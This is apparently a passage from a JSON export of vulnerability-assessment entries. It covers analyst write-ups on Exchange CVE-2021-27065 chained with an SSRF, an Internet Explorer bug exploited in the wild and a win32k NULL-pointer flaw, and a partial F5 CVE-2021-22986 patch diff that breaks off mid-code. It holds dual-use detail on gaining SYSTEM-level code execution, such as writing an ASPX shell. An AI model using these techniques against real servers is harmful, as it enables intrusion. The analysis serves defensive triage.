<Protocol>\r\n        <Type>EXPR</Type>\r\n        <Server>win-t4ro9496ta7.gibson.local</Server>\r\n        <SSL>Off</SSL>\r\n        <AuthPackage>Ntlm</AuthPackage>\r\n        <ServerExclusiveConnect>on</ServerExclusiveConnect>\r\n        <CertPrincipalName>None</CertPrincipalName>\r\n        <GroupingInformation>Default-First-Site-Name</GroupingInformation>\r\n      </Protocol>\r\n      <Protocol>\r\n        <Type>WEB</Type>\r\n        <Internal>\r\n          <OWAUrl AuthenticationMethod=\"Basic, Fba\">https://win-t4ro9496ta7.gibson.local/owa/</OWAUrl>\r\n          <Protocol>\r\n            <Type>EXCH</Type>\r\n            <ASUrl>https://win-t4ro9496ta7.gibson.local/EWS/Exchange.asmx</ASUrl>\r\n          </Protocol>\r\n        </Internal>\r\n      </Protocol>\r\n    </Account>\r\n  </Response>\r\n* Connection #0 to host 192.168.123.207 left intact\r\n</Autodiscover>* Closing connection 0\r\nwvu@kharak:~/Downloads$\r\n```",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "74177979-e2ef-4078-9f91-993964292cfa",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "bd645b28-c99e-42ea-a606-832f4f534945",
      "created": "2021-03-10T07:13:24.457885Z",
      "revisionDate": "2021-03-12T22:05:13.056238Z",
      "document": "When used with [CVE-2021-26855](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855), an unauthenticated SSRF, [CVE-2021-27065](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065) yields unauthed, `SYSTEM`-level RCE against a vulnerable Exchange Server. On its own, exploiting this vulnerability requires access to the [EAC/ECP interface](https://docs.microsoft.com/en-us/exchange/architecture/client-access/exchange-admin-center?view=exchserver-2019), which is a privileged and authenticated web interface.\r\n\r\nI was able to identify the relevant endpoints a few days ago using a combination of patch analysis and manual testing, and I successfully wrote an arbitrary file (sans SSRF) to the target's filesystem (UNC path). Ironically, I was looking at the virtual directory settings for [EWS](https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-reference-for-exchange), but \"OAB\" caught my eye due to its published IOCs. ([OAB](https://docs.microsoft.com/en-us/exchange/email-addresses-and-address-books/offline-address-books/offline-address-books?view=exchserver-2019) is Microsoft's implementation of offline address books in Exchange.)\r\n\r\n![](https://i.imgur.com/335hdGY.png)\r\n\r\nWriting an ASPX shell is the easiest way to achieve RCE using CVE-2021-27065, so make sure to look for filesystem IOCs. These IOCs are [well-documented](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/) by Microsoft and other entities. Bear in mind that attackers will try to use clever or randomized filenames to evade detection.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "fbf94efe-eccf-450a-9fb2-9e9479951c31",
      "editorId": "a21031d5-0022-4ab5-8982-86027fda65ed",
      "topicId": "51b6f576-3f28-4977-82bf-f5bc5e6cc416",
      "created": "2021-03-10T08:27:02.19877Z",
      "revisionDate": "2021-03-10T08:27:02.21224Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "59c7602d-e52b-4e7f-8144-513f1f60be9a",
      "editorId": "1798c4e1-56bb-46b2-9e1f-b13b2fd1ec02",
      "topicId": "75c30b6e-b4f9-447f-a6fc-3d93257c80d9",
      "created": "2021-03-10T12:42:45.433849Z",
      "revisionDate": "2021-03-10T12:42:45.448237Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Exfiltration",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "afaffe8d-f765-4ed8-9b03-8156ec788609",
      "editorId": "1798c4e1-56bb-46b2-9e1f-b13b2fd1ec02",
      "topicId": "07288e54-755d-4b3d-aead-2f3532454bfb",
      "created": "2021-03-10T12:44:13.448862Z",
      "revisionDate": "2021-03-10T12:44:13.453323Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Exfiltration",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "766c2bd5-492b-4a61-9dd3-6ef2110f65f7",
      "editorId": "1798c4e1-56bb-46b2-9e1f-b13b2fd1ec02",
      "topicId": "8c7760ba-b916-4f78-a95e-36192475b4da",
      "created": "2021-03-10T12:45:52.216258Z",
      "revisionDate": "2021-03-10T12:45:52.221829Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "bdafbcc3-4428-4187-9166-ebb8cb46a4c7",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "925f84d3-4fe0-4a18-baa9-170c701e718d",
      "created": "2021-03-11T17:57:59.756651Z",
      "revisionDate": "2021-08-17T23:21:52.570537Z",
      "document": "Update: This is now reported as having been exploited in the wild by North Korean APT actors along with CVE-2020-1380 as noted at https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/\r\n\r\nReported as exploited in the wild at https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-26411. Appears to be a memory corruption bug in Internet Explorer and Edge which would allow for a watering hole or drive by attack whereby a user is convinced to visit an attacker's malicious website and then the attacker would be able to gain RCE on the user's computer. Interestingly, despite this being a memory corruption bug, which is typically harder to exploit, Microsoft has still written up the exploitability of this vulnerability as Low. \r\n\r\nThere also appears to be an analysis of this vulnerability at https://enki.co.kr/blog/2021/02/04/ie_0day.html which suggests that this was the vulnerability used by the Laurus APT group to attack security researchers in Feburary. An English summary can be found at https://www.bleepingcomputer.com/news/security/hacking-group-also-used-an-ie-zero-day-against-security-researchers/ which suggests that this vulnerability was a double free vulnerability in IE which was triggered by sending a user a malicious MHT/MHTML file, and if the user allowed script execution, then CVE-2021-26411 would be exploited.\r\n\r\nGiven that Mitja Kolsek of 0Patch was able to replicate this issue relatively quickly, I'd say its likely that attackers will be able to exploit this vulnerability as well. I would expect to see more widespread exploitation of this vulnerability in the coming months.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b44c3dde-3e22-4655-bf67-a91d0c7e4aaa",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "ac6ef4eb-7075-41dd-be7a-00dea8b5ba3f",
      "created": "2021-03-11T18:25:13.474031Z",
      "revisionDate": "2021-03-17T17:03:10.611992Z",
      "document": "Interesting, so this was a bug within `win32kfull.sys!BLTRECORD::bRotate` originally disclosed by ZDI as ZDI-CAN-12671, which was a NULL pointer dereference vulnerability within Windows's win32kfull.sys/win32k.sys kernel driver. However Microsoft originally didn't want to patch this, most likely because Windows 8 and later has memory protections that prevent one from mapping the first 64kb or so of memory, thereby making it nearly impossible to map the NULL page unless NTVM is enabled for 16 bit support. \r\n\r\nHowever with this being said there have been bypasses of the NULL page protection. One of the most notable was https://twitter.com/waleedassar/status/1270550282695585792/photo/1 which shows that if Intel SGX is enabled on a target PC, it is possible to use `NtCreateEnclave()` to reserve the NULL page in memory. I imagine that other bypasses may exist however given their rarity and Microsoft's williness to patch them as fast as possible, they are likely traded privately.\r\n\r\nInterestingly this vulnerability also affects Windows 7 and Windows Server 2008 and 2008 R2, which only later got these NULL page mitigations backported from Windows 8. Therefore whilst its unlikely that recently updated systems are going to be able to be exploited as a result of this NULL page mitigation backporting, its possible that servers running very outdated versions of these systems may be readily exploitable via this vulnerability.\r\n\r\nAssuming the NULL page is mapped though, what will happen is that if the 4 parameter version of `win32kfull.sys!BLTRECORD::bRotate` is called with a `flag` parameter that has the `HOOK_PLGBLT` bit set within it, it will take the surface object that it is trying to draw on and will look at that surface object's `hdev` field to find the handle to the device driver to use. It will then attempt to call the `DrvPlgBlt()` function of the device driver without first checking to see if that device driver specified by `hdev` provides a `DrvPlgBlt()` function. This can lead to an attempt to execute code from the NULL page as SYSTEM.\r\n\r\nSo overall if you can map the NULL page this is a pretty easy vulnerability to exploit, but with the backporting of the NULL page mitigation and the standardization of preventing the NULL page from being mapped starting with Windows 8, its easy to understand why this was less of a concern for Microsoft to fix.\r\n",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "f6b19d24-b24e-4abd-98cf-2988d7424311",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "930a50ff-16a2-4ea8-91c8-71360a643e5e",
      "created": "2021-03-14T10:18:38.157292Z",
      "revisionDate": "2022-05-10T21:32:42.006368Z",
      "document": "# CVE-2021-22986\r\n\r\n_This writeup has been updated to thoroughly reflect my findings and that of the community's. Thank you!_\r\n\r\n[This vulnerability](https://support.f5.com/csp/article/K03009991) appears to involve some kind of auth bypass or even SSRF, judging by my patch analysis and testing. The full-context patch below has its line numbers adjusted for use in a debugger.\r\n\r\n```diff\r\ndiff --git a/com/f5/rest/app/RestServerServlet.java b/com/f5/rest/app/RestServerServlet.java\r\nindex 9cd36e1..c0c67d6 100644\r\n--- a/com/f5/rest/app/RestServerServlet.java\r\n+++ b/com/f5/rest/app/RestServerServlet.java\r\n@@ -1,538 +1,539 @@\r\n package com.f5.rest.app;\r\n\r\n import com.f5.rest.common.ByteUnit;\r\n import com.f5.rest.common.HttpParserHelper;\r\n import com.f5.rest.common.RestHelper;\r\n import com.f5.rest.common.RestLogger;\r\n import com.f5.rest.common.RestOperation;\r\n import com.f5.rest.common.RestOperationIdentifier;\r\n import com.f5.rest.common.RestRequestCompletion;\r\n import com.f5.rest.common.RestServer;\r\n import com.f5.rest.common.RestWorkerUriNotFoundException;\r\n import java.io.ByteArrayOutputStream;\r\n import java.io.IOException;\r\n import java.net.URI;\r\n import java.net.URISyntaxException;\r\n import java.nio.charset.StandardCharsets;\r\n import java.util.Enumeration;\r\n import java.util.HashMap;\r\n import java.util.Map;\r\n import java.util.logging.Level;\r\n import java.util.logging.Logger;\r\n import javax.servlet.AsyncContext;\r\n import javax.servlet.ReadListener;\r\n import javax.servlet.ServletException;\r\n import javax.servlet.ServletInputStream;\r\n import javax.servlet.ServletOutputStream;\r\n import javax.servlet.WriteListener;\r\n import javax.servlet.http.HttpServlet;\r\n import javax.servlet.http.HttpServletRequest;\r\n import javax.servlet.http.HttpServletResponse;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n public class RestServerServlet\r\n   extends HttpServlet\r\n {\r\n   private static final long serialVersionUID = -6003011105634738728L;\r\n   private static final int BUFFER_SIZE = (int)ByteUnit.KILOBYTES.toBytes(8L);\r\n   private Logger logger = RestLogger.getLogger(RestServerServlet.class.getName());\r\n\r\n\r\n\r\n   private static void failRequest(AsyncContext context, RestOperation operation, Throwable t, int httpStatusCode) {\r\n     if (operation.generateRestErrorResponse()) {\r\n       operation.setErrorResponseBody(t);\r\n     }\r\n\r\n     operation.setStatusCode(httpStatusCode);\r\n     sendRestOperation(context, operation);\r\n   }\r\n\r\n   private static void sendRestOperation(AsyncContext context, RestOperation operation) {\r\n     try {\r\n       writeResponseHeadersFromRestOperation(operation, (HttpServletResponse)context.getResponse());\r\n       context.getResponse().getOutputStream().setWriteListener(new WriteListenerImpl(context, operation));\r\n     } catch (IOException e) {\r\n       context.complete();\r\n     }\r\n   }\r\n\r\n\r\n   private class ReadListenerImpl\r\n     implements ReadListener\r\n   {\r\n     private AsyncContext context;\r\n\r\n     private ServletInputStream inputStream;\r\n     private RestOperation operation;\r\n     private byte[] buffer;\r\n     private ByteArrayOutputStream outputStream;\r\n\r\n     ReadListenerImpl(AsyncContext context, ServletInputStream inputStream, RestOperation operation) {\r\n       this.context = context;\r\n       this.inputStream = inputStream;\r\n       this.operation = operation;\r\n       this.buffer = null;\r\n       this.outputStream = null;\r\n     }\r\n\r\n\r\n     public void onDataAvailable() throws IOException {\r\n       if (this.operation == null) {\r\n         throw new IOException(\"Missing operation\");\r\n       }\r\n\r\n       if (this.outputStream == null) {\r\n         int contentLength = (int)this.operation.getContentLength();\r\n         if (contentLength == -1) {\r\n           this.outputStream = new ByteArrayOutputStream();\r\n         } else {\r\n           this.outputStream = new ByteArrayOutputStream(contentLength);\r\n         }\r\n       }\r\n\r\n\r\n\r\n\r\n\r\n       if (this.buffer == null)\r\n         this.buffer = new byte[RestServerServlet.BUFFER_SIZE];\r\n       int len;\r\n       while (this.inputStream.isReady() && (len = this.inputStream.read(this.buffer)) != -1) {\r\n         this.outputStream.write(this.buffer, 0, len);\r\n       }\r\n     }\r\n\r\n\r\n     public void onAllDataRead() throws IOException {\r\n       if (this.outputStream != null) {\r\n\r\n         if (this.operation.getContentType() == null) {\r\n           this.operation.setIncomingContentType(\"application/json\");\r\n         }\r\n\r\n         if (RestHelper.contentTypeUsesBinaryBody(this.operation.getContentType())) {\r\n           byte[] binaryBody = this.outputStream.toByteArray();\r\n           this.operation.setBinaryBody(binaryBody, this.operation.getContentType());\r\n         } else {\r\n           String body = this.outputStream.toString(StandardCharsets.UTF_8.name());\r\n           this.operation.setBody(body, this.operation.getContentType());\r\n         }\r\n       }\r\n\r\n       RestOperationIdentifier.setIdentityFromAuthenticationData(this.operation, new Runnable()\r\n           {\r\n             public void run()\r\n             {\r\n               if (!RestServer.trySendInProcess(RestServerServlet.ReadListenerImpl.this.operation)) {\r\n                 RestServerServlet.failRequest(RestServerServlet.ReadListenerImpl.this.context, RestServerServlet.ReadListenerImpl.this.operation, (Throwable)new RestWorkerUriNotFoundException(RestServerServlet.ReadListenerImpl.this.operation.getUri().toString()), 404);\r\n               }\r\n             }\r\n           });\r\n\r\n\r\n\r\n       RestServer.trace(this.operation);\r\n     }\r\n\r\n\r\n     public void onError(Throwable throwable) {\r\n       if (this.operation != null)\r\n         this.operation.fail(throwable);\r\n     }\r\n   }\r\n\r\n   private static class WriteListenerImpl\r\n     implements WriteListener\r\n   {\r\n     AsyncContext context;\r\n     RestOperation operation;\r\n     byte[] responseBody;\r\n     ServletOutputStream outputStream;\r\n\r\n     public WriteListenerImpl(AsyncContext context, RestOperation operation) {\r\n       this.context = context;\r\n       this.responseBody = HttpParserHelper.encodeBody(operation);\r\n       if (this.responseBody != null) {\r\n         context.getResponse().setContentLength(this.responseBody.length);\r\n       }\r\n\r\n       try {\r\n         this.outputStream = context.getResponse().getOutputStream();\r\n       } catch (IOException e) {\r\n         onError(e);\r\n       }\r\n     }\r\n\r\n\r\n\r\n     public void onWritePossible() throws IOException {\r\n       while (this.outputStream.isReady()) {\r\n         if (this.responseBody != null) {\r\n           this.outputStream.write(this.responseBody);\r\n           this.responseBody = null; continue;\r\n         }\r\n         this.context.complete();\r\n         return;\r\n       }\r\n     }\r\n\r\n\r\n\r\n     public void onError(Throwable throwable) {\r\n       this.operation.fail(throwable);\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n   protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\r\n     final AsyncContext context = req.startAsync();\r\n\r\n     context.start(new Runnable()\r\n         {\r\n           public void run() {\r\n             RestOperation op = null;\r\n             try {\r\n               op = RestServerServlet.this.createRestOperationFromServletRequest((HttpServletRequest)context.getRequest());\r\n               if (op == null) {\r\n                 HttpServletResponse errResp = (HttpServletResponse)context.getResponse();\r\n\r\n                 errResp.sendError(400, \"Error processing request\");\r\n\r\n                 context.complete();\r\n                 return;\r\n               }\r\n             } catch (Exception e) {\r\n               RestServerServlet.this.logger.warning(\"cannot create RestOperation \" + e.getMessage());\r\n               context.complete();\r\n\r\n               return;\r\n             }\r\n             op.setCompletion(new RestRequestCompletion()\r\n                 {\r\n                   public void completed(RestOperation operation) {\r\n                     RestServerServlet.sendRestOperation(context, operation);\r\n                   }\r\n\r\n\r\n                   public void failed(Exception ex, RestOperation operation) {\r\n                     RestServerServlet.failRequest(context, operation, ex, operation.getStatusCode());\r\n                   }\r\n                 });\r\n\r\n             try {\r\n               ServletInputStream inputStream = context.getRequest().getInputStream();\r\n               inputStream.setReadListener(new RestServerServlet.ReadListenerImpl(context, inputStream, op));\r\n             } catch (IOException e) {\r\n               RestServerServlet.failRequest(context, op, e, 500);\r\n             }\r\n           }\r\n         });\r\n   }\r\n\r\n\r\n\r\n   public static String getFullURL(HttpServletRequest request) {\r\n     StringBuilder requestURL = new StringBuilder(request.getRequestURI());\r\n     String queryString = request.getQueryString();\r\n\r\n     if (queryString == null) {\r\n       return requestURL.toString();\r\n     }\r\n     return requestURL.append('?').append(queryString).toString();\r\n   }\r\n\r\n\r\n   private static void writeResponseHeadersFromRestOperation(RestOperation operation, HttpServletResponse response) {\r\n     boolean traceHeaders = (RestHelper.getOperationTracingLevel().intValue() <= Level.FINER.intValue());\r\n\r\n-    if (operation.getOutgoingContentType() == null) {\r\n+    if (operation.getOutgoingContentType() == null || operation.getStatusCode() >= 400)\r\n+    {\r\n       operation.defaultToContentTypeJson();\r\n     }\r\n\r\n     response.setContentType(operation.getOutgoingContentType());\r\n\r\n     if (operation.getOutgoingContentEncoding() != null) {\r\n       response.setCharacterEncoding(operation.getOutgoingContentEncoding());\r\n     }\r\n\r\n     if (operation.getAllow() != null) {\r\n       AddResponseHeader(operation, response, \"Allow\", operation.getAllow(), traceHeaders);\r\n     }\r\n     if (operation.getContentRange() != null) {\r\n       AddResponseHeader(operation, response, \"Content-Range\", operation.getContentRange(), traceHeaders);\r\n     }\r\n\r\n     if (operation.getContentDisposition() != null) {\r\n       AddResponseHeader(operation, response, \"Content-Disposition\", operation.getContentDisposition(), traceHeaders);\r\n     }\r\n\r\n     if (operation.getWwwAuthenticate() != null) {\r\n       AddResponseHeader(operation, response, \"WWW-Authenticate\", operation.getWwwAuthenticate(), traceHeaders);\r\n     }\r\n\r\n     if (operation.containsApiStatusInformation()) {\r\n       AddResponseHeader(operation, response, \"X-F5-Api-Status\", HttpParserHelper.formatApiStatusHeader(operation), traceHeaders);\r\n     }\r\n\r\n     if (operation.getAdditionalHeaders(RestOperation.Direction.RESPONSE) != null) {\r\n       Map<String, String> headers = operation.getAdditionalHeaders(RestOperation.Direction.RESPONSE).getHeaderMap();\r\n\r\n       for (Map.Entry<String, String> header : headers.entrySet()) {\r\n         AddResponseHeader(operation, response, header.getKey(), header.getValue(), traceHeaders);\r\n       }\r\n     }\r\n\r\n     response.setStatus(operation.getStatusCode());\r\n     AddResponseHeader(operation, response, \"Pragma\", \"no-cache\", traceHeaders);\r\n     AddResponseHeader(operation, response, \"Cache-Control\", \"no-store\", traceHeaders);\r\n     AddResponseHeader(operation, response, \"Cache-Control\", \"no-cache\", traceHeaders);\r\n     AddResponseHeader(operation, response, \"Cache-Control\", \"must-revalidate\", traceHeaders);\r\n     AddResponseHeader(operation, response, \"Expires\", \"-1\", traceHeaders);\r\n   }\r\n\r\n\r\n   private static void AddResponseHeader(RestOperation operation, HttpServletResponse response, String headerName, String headerValue, boolean traceHeaders) {\r\n     response.addHeader(headerName, headerValue);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   private static Map<String, HeaderHandler> HEADER_HANDLERS = new HashMap<>();\r\n   static {\r\n     HEADER_HANDLERS.put(\"Accept\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setAccept(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"Authorization\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op)\r\n           {\r\n             String[] authHeader = headerValue.split(\" \");\r\n             if (authHeader[0].equalsIgnoreCase(\"BASIC\")) {\r\n               op.setBasicAuthorizationHeader(authHeader[1]);\r\n             }\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"Allow\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setAllow(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"Transfer-Encoding\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setTransferEncoding(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"Referer\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setReferer(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"X-F5-REST-Coordination-Id\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setCoordinationId(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"X-Forwarded-For\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setXForwardedFor(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"X-Auth-Token\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setXAuthToken(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"X-F5-Auth-Token\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setXF5AuthToken(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"Connection\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             if (headerValue.equalsIgnoreCase(\"Keep-Alive\")) {\r\n               op.setConnectionKeepAlive(true);\r\n               op.setConnectionClose(false);\r\n             } else if (headerValue.equalsIgnoreCase(\"Close\")) {\r\n               op.setConnectionKeepAlive(false);\r\n               op.setConnectionClose(true);\r\n             } else {\r\n               op.setConnectionKeepAlive(false);\r\n               op.setConnectionClose(false);\r\n             }\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"Content-Length\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setContentLength(Integer.parseInt(headerValue));\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"Content-Type\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setIncomingContentType(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"Content-Range\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setContentRange(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"Content-Disposition\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setContentDisposition(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"X-F5-Gossip\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setGossipHeader(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"X-F5-Api-Status\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             HttpParserHelper.formatFromApiStatusHeader(op, headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"X-F5-Config-Api-Status\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String bitMaskStr, RestOperation op) {\r\n             try {\r\n               long bitMask = Long.parseLong(bitMaskStr);\r\n               op.setXF5ConfigApiStatus(bitMask);\r\n             }\r\n             catch (NumberFormatException ignored) {}\r\n           }\r\n         